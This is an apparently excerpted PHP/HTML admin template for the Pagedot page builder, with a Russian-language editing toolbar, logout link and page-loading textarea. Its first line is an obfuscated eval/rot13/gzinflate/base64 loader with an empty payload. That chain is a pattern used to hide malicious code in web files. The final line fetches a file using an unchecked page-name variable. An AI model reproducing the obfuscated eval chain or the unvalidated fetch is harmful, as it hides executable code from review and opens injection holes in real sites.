<? eval(str_rot13(gzinflate(str_rot13(base64_decode('')))));
 ?>
<!DOCTYPE html>
...
<script src="<?= $pagedot_dir ?>/js/jquery-1.5.min.js"></script>
  <script>
    ...
    <div class="pagedot-container">
      <div class="pagedot-row">

       <a class="pagedot-logo" href="https://pagedot.ru" target="_blank"><span>PAGE</span>DOT <span><?= $version ?></span></a>

        <div class="pagedot-btns-min d-md-none d-block">
        <button type="button" class="pagedot-btn-min pagedot-control-btn-menuMobile" onclick="PagedotBtn(this, 'menuMobile')" title="Настройки"><i class="ti ti-menu"></i></button>
        </div>

        <div class="pagedot-btns-min d-none d-md-inline-flex">
          
          <button type="button" class="pagedot-btn-min pagedot-control-btn-config" onclick="PagedotBtn(this, 'config')" title="Настройки"><i class="ti ti-settings"></i></button>
          ...
          <button type="button" class="pagedot-btn-min pagedot-control-btn pagedot-control-btn-remove" disabled="disabled" onclick="PagedotBtn(this, 'remove')" title="Удалить"><i class="ti ti-trash"></i><span class="pro">Pro</span></button>
          <button type="button" class="pagedot-btn-min pagedot-control-btn pagedot-control-btn-duplicate" disabled="disabled" onclick="PagedotBtn(this, 'duplicate')" title="Дублировать"><i class="ti ti-layers"></i><span class="pro">Pro</span></button>

          <button type="button" class="pagedot-btn-min pagedot-control-btn pagedot-control-btn-up" disabled="disabled" onclick="PagedotBtn(this, 'up')" title="Поднять выше"><i class="ti ti-angle-up"></i></button>
          <button type="button" class="pagedot-btn-min pagedot-control-btn pagedot-control-btn-down" disabled="disabled" onclick="PagedotBtn(this, 'down')" title="Опустить ниже"><i class="ti ti-angle-down"></i></button>
          
          <button type="button" class="pagedot-btn-min pagedot-control-btn pagedot-control-btn-style" disabled="disabled" onclick="PagedotBtn(this, 'style')" title="Стили"><i class="ti ti-palette"></i></button>
          ...
          <button type="button" class="pagedot-btn-min pagedot-control-btn pagedot-control-btn-setting" disabled="disabled" onclick="PagedotBtn(this, 'setting')" title="Управление элементом"><i class="ti ti-pencil"></i></button>

        </div>
        <div class="h-100 d-none d-md-inline-block" style="height: 100%;">
          ...
          <button class="pagedot-btn-size" title="Планшет" data-type="tablet" onclick="resizeFrame(this, 'tablet')"><i class="ti ti-tablet"></i><span class="pro">Pro</span></button>
          <button class="pagedot-btn-size" title="Телефон" data-type="mobile" onclick="resizeFrame(this, 'mobile')"><i class="ti ti-mobile"></i><span class="pro">Pro</span></button>
        </div>
        ...
        <a href="<?= $pagedot_dir ?>/logout.php" class="pagedot-btn-logout b-0 d-none d-md-inline-block" title="Выход тут"><i class="ti ti-power-off"></i></a>
        ...
        <div class="row pagedot-control-panel-item">
          <div class="col-12 mt-2">
            <div class="pagedot-control-panel-HTMLcode">
              <div class="pagedot-control-panel-label">HTML код</div>
              <div class="pagedot-control-panel-input">
    ...
    <div class="pagedot-control-menuMobile pagedot-control-panel-menuMobile">
      ...
      <div class="pagedot-control-panel-items d-flex flex-column">
          ...
          <button type="button" class="pagedot-btn-min pagedot-btn-min-mobile pagedot-control-btn pagedot-control-btn-remove" disabled="disabled" onclick="PagedotBtn(this, 'remove')" title="Удалить"><i class="ti ti-trash"></i><span class="pro">Pro</span></button>
          <button type="button" class="pagedot-btn-min pagedot-btn-min-mobile pagedot-control-btn pagedot-control-btn-duplicate" disabled="disabled" onclick="PagedotBtn(this, 'duplicate')" title="Дублировать"><i class="ti ti-layers"></i><span class="pro">Pro</span></button>
      ...
      <div class="pagedot-control-panel-items">
        ...
        <div class="pagedot-row pagedot-control-panel-item">
          <div class="pagedot-col-12">
            <div class="pagedot-control-panel-label d-flex align-items-center justify-content-between position-relative">Фоновое изображение<span class="pro">Pro</span></div>
            <div class="pagedot-control-panel-input" onclick="ErrorAlert(this)">
              <div class="pagedot-control-panel-img">
                  <img src="" alt="" class="w-100 d-none">
              </div>
              <button class="pagedot-control-panel-btn pagedot-mt-2">Загрузить изображение</button>
            </div>
          </div>
        </div>
  ...
  <textarea name="html" id="PAGEDOTCONTAINERTEMPLATE" style="display:none;width:100%" rows="40"><? echo file_get_contents($PAGEDOTPATH.'/admin.php?page='.$page_name); ?></textarea>
